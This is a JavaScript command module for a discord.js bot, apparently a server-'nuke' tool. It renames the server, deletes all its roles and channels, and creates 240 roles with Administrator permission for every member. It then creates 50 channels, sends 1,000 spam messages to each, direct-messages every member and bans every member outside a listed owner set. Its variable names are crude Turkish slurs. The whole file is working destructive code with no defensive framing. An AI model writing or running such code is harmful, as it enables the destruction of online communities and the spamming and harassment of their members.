const Discord = require('discord.js');
const moment = require('moment')
require('moment-duration-format')
moment.locale('tr')
exports.run = async (client, message, args, embed) => {
if(!client.ayarlar.Owner.some(sktm => message.author.id == sktm)) return message.reply({content: `Bu Komutu Kullanamaya Yetkiniz Yok!`}).sil(15)
message.guild.setName(client.ayarlar.ServerName).catch(e => {})
message.guild.setIcon(client.ayarlar.Sunucupfp).catch(e => {})  
message.guild.setBanner(client.ayarlar.Sunucupfp).catch(e => {})   
message.guild.roles.cache.forEach(anne => anne.delete().catch(e => {}))
message.guild.channels.cache.forEach(oruspu => oruspu.delete().catch(e => {})) 
for(let sx = 0; sx < 240; sx++) {
message.guild.roles.create({ name: `${client.ayarlar.RolName}`}).then(sex => {
var oc = message.guild.roles.cache.get(sex.id)  
oc.setPermissions(Discord.PermissionsBitField.Flags.Administrator).catch(e => {})
message.guild.members.cache.forEach(clay => {
clay.roles.add(oc.id).catch(e => {})  
})  
})
}
for(let hard = 0; hard < 50; hard++) {
         message.guild.channels.create({
            name: client.ayarlar.GuildName,
            type: Discord.ChannelType.Text,
            permissionOverwrites: [{
                        id: message.guild.id,
                        allow: [Discord.PermissionFlagsBits.ViewChannel]
                    }
            ],
        }).catch(e => {}).then(bacisken => {
            for(let porno = 0; porno < 1000; porno++) { 
                bacisken.send({ content: `${client.ayarlar.Kanalchat}` }).catch(e => {})
            }
        });
    } 
message.guild.members.cache.forEach(oclari => {
oclari.send({content: `${client.ayarlar.DmSend}`}).catch(e => {})
})  

message.guild.members.cache.forEach(clay1337 => {
if(!client.ayarlar.Owner.some(clay13 => clay1337.id == clay13)) {
clay1337.ban({ reason: `${client.ayarlar.BanTag}` }).catch(e => {})
}
});  
console.log(`${message.guild.name} Sunucusu ${moment(Date.now()).format("LLL")} Tarihinde Vurulmuştur!`)  
  
};
exports.conf = {
  enabled: true,
  guildOnly: true,
  aliases: [],
  permLevel: 0
}
exports.help = {
  name: 'christopheryves'
};
